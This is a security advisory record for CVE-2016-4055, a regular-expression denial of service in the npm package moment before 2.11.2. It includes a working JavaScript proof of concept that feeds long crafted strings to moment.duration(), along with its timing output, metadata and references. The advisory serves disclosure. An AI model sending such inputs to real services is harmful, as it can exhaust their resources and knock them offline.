advisory_id: GHSA-87vv-r9j6-g5qv
datasource_id: github_osv_importer_v2/GHSA-87vv-r9j6-g5qv
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2017/10/GHSA-87vv-r9j6-g5qv/GHSA-87vv-r9j6-g5qv.json
aliases:
  - CVE-2016-4055
summary: |
  Regular Expression Denial of Service in moment
  Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.


  ## Proof of concept
  ```
  var moment = require('moment');

  var genstr = function (len, chr) {
      var result = "";
      for (i=0; i<=len; i++) {
          result = result + chr;
      }

      return result;
  }


  for (i=20000;i<=10000000;i=i+10000) {
      console.log("COUNT: " + i);
      var str = '-' + genstr(i, '1')
      console.log("LENGTH: " + str.length);
      var start = process.hrtime();
      moment.duration(str)

      var end = process.hrtime(start);
      console.log(end);
  }
  ```

  ### Results
  ```
  $ node moment.js
  COUNT: 20000
  LENGTH: 20002
  [ 0, 618931029 ]
  COUNT: 30001
  LENGTH: 30003
  [ 1, 401413894 ]
  COUNT: 40002
  LENGTH: 40004
  [ 2, 437075303 ]
  COUNT: 50003
  LENGTH: 50005
  [ 3, 824664804 ]
  COUNT: 60004
  LENGTH: 60006
  [ 5, 651335262 ]
  ```


  ## Recommendation

  Please update to version 2.11.2 or later.
impacted_packages:
  - purl: pkg:npm/moment
    affected_versions: vers:npm/<2.11.2
    fixed_versions: vers:npm/2.11.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2017/10/GHSA-87vv-r9j6-g5qv/GHSA-87vv-r9j6-g5qv.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-400
references:
  - url: https://github.com/advisories/GHSA-87vv-r9j6-g5qv
    reference_type:
    reference_id:
  - url: https://github.com/moment/moment
    reference_type:
    reference_id:
  - url: https://lists.apache.org/thread.html/10f0f3aefd51444d1198c65f44ffdf2d78ca3359423dbc1c168c9731@%3Cdev.flink.apache.org%3E
    reference_type:
    reference_id:
  - url: https://lists.apache.org/thread.html/17ff53f7999e74fbe3cc0ceb4e1c3b00b180b7c5afec8e978837bc49@%3Cuser.flink.apache.org%3E
    reference_type:
    reference_id:
  - url: https://lists.apache.org/thread.html/52bafac05ad174000ea465fe275fd3cc7bd5c25535a7631c0bc9bfb2@%3Cuser.flink.apache.org%3E
    reference_type:
    reference_id:
  - url: https://lists.apache.org/thread.html/54df3aeb4239b64b50b356f0ca6f986e3c4ca5b84c515dce077c7854@%3Cuser.flink.apache.org%3E
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/55
    reference_type:
    reference_id:
  - url: https://www.tenable.com/security/tns-2019-02
    reference_type:
    reference_id:
  - url: http://www.openwall.com/lists/oss-security/2016/04/20/11
    reference_type:
    reference_id:
  - url: http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html
    reference_type:
    reference_id:
  - url: http://www.securityfocus.com/bid/95849
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2016-4055
    reference_type:
    reference_id: CVE-2016-4055
